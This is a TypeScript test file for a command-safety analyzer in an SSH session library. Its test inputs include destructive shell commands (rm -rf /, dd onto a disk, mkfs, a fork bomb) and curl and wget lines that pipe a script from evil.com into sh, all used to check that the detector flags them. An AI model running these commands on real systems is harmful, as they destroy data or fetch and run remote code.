import { describe, test, expect, beforeEach } from 'bun:test';
import { InteractiveSSHSession } from '../../lib/interactive-session.js';

describe('Command Safety Analysis', () => {
  let session: any;

  beforeEach(() => {
    // Create session with dummy config (won't actually connect)
    session = new InteractiveSSHSession({
      host: 'test.example.com',
      user: 'testuser',
      port: 22
    });
  });

  describe('Dangerous Commands', () => {
    test('should detect rm -rf /', () => {
      const analysis = session.analyzeCommand('rm -rf /');
      expect(analysis.dangerous).toBe(true);
      expect(analysis.safe).toBe(false);
      expect(analysis.blockedReason).toContain('destructive');
    });

    test('should detect dd to disk', () => {
      const analysis = session.analyzeCommand('dd if=/dev/zero of=/dev/sda');
      expect(analysis.dangerous).toBe(true);
      expect(analysis.safe).toBe(false);
    });

    test('should detect mkfs commands', () => {
      const analysis = session.analyzeCommand('mkfs.ext4 /dev/sda1');
      expect(analysis.dangerous).toBe(true);
    });

    test('should detect fork bombs', () => {
      const analysis = session.analyzeCommand(':(){ :|:& };:');
      expect(analysis.dangerous).toBe(true);
    });

    test('should detect chmod 777 on root', () => {
      const analysis = session.analyzeCommand('chmod -R 777 /');
      expect(analysis.dangerous).toBe(true);
    });

    test('should detect curl pipe to shell', () => {
      const analysis = session.analyzeCommand('curl http://evil.com/script.sh | sh');
      expect(analysis.dangerous).toBe(true);
    });

    test('should detect wget pipe to shell', () => {
      const analysis = session.analyzeCommand('wget -O- http://evil.com/script.sh | sh');
      expect(analysis.dangerous).toBe(true);
    });
  });

  describe('Suspicious Commands', () => {
    test('should detect sudo rm', () => {
      const analysis = session.analyzeCommand('sudo rm -rf /tmp/test');
      expect(analysis.suspicious).toBe(true);
      expect(analysis.dangerous).toBe(false);
    });

    test('should detect chmod 777', () => {
      const analysis = session.analyzeCommand('chmod 777 /tmp/file');
      expect(analysis.suspicious).toBe(true);
    });

    test('should detect output redirection to /dev/null', () => {
      const analysis = session.analyzeCommand('command > /dev/null 2>&1');
      expect(analysis.suspicious).toBe(true);
    });

    test('should detect base64 decode', () => {
      const analysis = session.analyzeCommand('echo "encoded" | base64 --decode');
      expect(analysis.suspicious).toBe(true);
    });
  });

  describe('Safe Commands', () => {
    test('should allow normal ls command', () => {
      const analysis = session.analyzeCommand('ls -la');
      expect(analysis.safe).toBe(true);
      expect(analysis.dangerous).toBe(false);
      expect(analysis.suspicious).toBe(false);
    });

    test('should allow echo commands', () => {
      const analysis = session.analyzeCommand('echo "Hello World"');
      expect(analysis.safe).toBe(true);
    });

    test('should allow grep commands', () => {
      const analysis = session.analyzeCommand('grep "pattern" /var/log/syslog');
      expect(analysis.safe).toBe(true);
    });

    test('should allow normal rm in user directory', () => {
      const analysis = session.analyzeCommand('rm /home/user/file.txt');
      expect(analysis.safe).toBe(true);
      expect(analysis.dangerous).toBe(false);
    });

    test('should allow df command', () => {
      const analysis = session.analyzeCommand('df -h');
      expect(analysis.safe).toBe(true);
    });

    test('should allow ps command', () => {
      const analysis = session.analyzeCommand('ps aux | grep nginx');
      expect(analysis.safe).toBe(true);
    });
  });

  describe('Command History', () => {
    test('should have empty history initially', () => {
      const history = session.getHistory();
      expect(history.length).toBe(0);
    });

    test('should respect history limit', () => {
      // Add mock history
      for (let i = 0; i < 100; i++) {
        session.commandHistory.push({
          command: `test ${i}`,
          timestamp: Date.now(),
          analysis: { safe: true },
          executed: true
        });
      }
      
      const history = session.getHistory(10);
      expect(history.length).toBe(10);
    });
  });

  describe('Session Status', () => {
    test('should return valid status object', () => {
      const status = session.getStatus();
      expect(status).toHaveProperty('sessionId');
      expect(status).toHaveProperty('connected');
      expect(status).toHaveProperty('server');
      expect(status).toHaveProperty('commandCount');
      expect(status.connected).toBe(false);
    });

    test('should track command count', () => {
      session.commandHistory.push({ command: 'test', timestamp: Date.now() });
      const status = session.getStatus();
      expect(status.commandCount).toBe(1);
    });
  });
});
